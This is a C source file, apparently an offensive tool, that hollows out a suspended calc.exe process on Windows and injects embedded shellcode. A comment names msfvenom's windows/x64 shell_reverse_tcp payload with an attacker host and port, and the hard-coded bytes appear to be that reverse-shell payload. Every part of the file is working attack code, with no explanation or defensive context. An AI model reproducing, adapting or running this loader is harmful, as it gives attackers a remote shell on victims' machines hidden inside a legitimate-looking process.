#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <wchar.h>

// Use your shellcode : msfvenom -p windows/x64/shell_reverse_tcp LHOST=<Your(attacker) IP address> LPORT=<Your(attacker) port number> -f c 
// Example			  : msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=5555 -f c
char shellcode[] = {
                            "\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x48\x31\xd2\x56\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x8b\x48\x18\x50\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88"
"\x48\x01\xd6\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58"
"\x5e\x59\x48\x01\xd0\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
"\x89\xe5\x49\xbc\x02\x00\x15\xb3\xc0\xa8\x01\x0a\x41\x54"
"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
"\xf0\xb5\xa2\x56\xff\xd5"
};

int main() {

    // Step 1: Create a new process in suspended state
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessA(NULL, (LPSTR)"calc.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[ERROR] Could not create process [%d]\n", GetLastError());
        return 1;
    }
    printf("[+] Created process in suspended state!\n");

    // Step 2: Unmap the original executable
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        printf("[ERROR] Could not get handle to ntdll.dll [%d]\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    if (!NtUnmapViewOfSection) {
        printf("[ERROR] Could not get address of NtUnmapViewOfSection [%d]\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    NTSTATUS status = NtUnmapViewOfSection(pi.hProcess, (PVOID)0x00400000);
    if (status == 0xC0000019) {  // STATUS_CONFLICTING_ADDRESSES
        printf("[WARNING] Conflicting addresses, trying a different address\n");
    }

    // Step 3: Allocate memory for shellcode without specifying a fixed address
    LPVOID pAddress = VirtualAllocEx(pi.hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pAddress == NULL) {
        printf("[ERROR] Could not allocate remote memory [%d]\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] Memory allocated Successfully!\n");

    // Step 4: Write the shellcode into the allocated memory
    if (WriteProcessMemory(pi.hProcess, pAddress, shellcode, sizeof(shellcode), NULL) == 0) {
        printf("[ERROR] Could not write to remote memory [%d]\n", GetLastError());
        VirtualFreeEx(pi.hProcess, pAddress, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] Shellcode has been writen in the memory successfully!\n");

    // Step 5: Set the entry point of the process to the start of the shellcode
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("[ERROR] Could not get thread context [%d]\n", GetLastError());
        VirtualFreeEx(pi.hProcess, pAddress, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    ctx.Rcx = (DWORD64)pAddress;

    if (!SetThreadContext(pi.hThread, &ctx)) {
        printf("[ERROR] Could not set thread context [%d]\n", GetLastError());
        VirtualFreeEx(pi.hProcess, pAddress, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] Entry point has been set successfully!\n");

    // Step 6: Resume the process
    if (ResumeThread(pi.hThread) == -1) {
        printf("[ERROR] Failed to resume thread\n");
        VirtualFreeEx(pi.hProcess, pAddress, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }
    printf("[+] Thread has been resumed successfully!\n");

    // Clean up
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}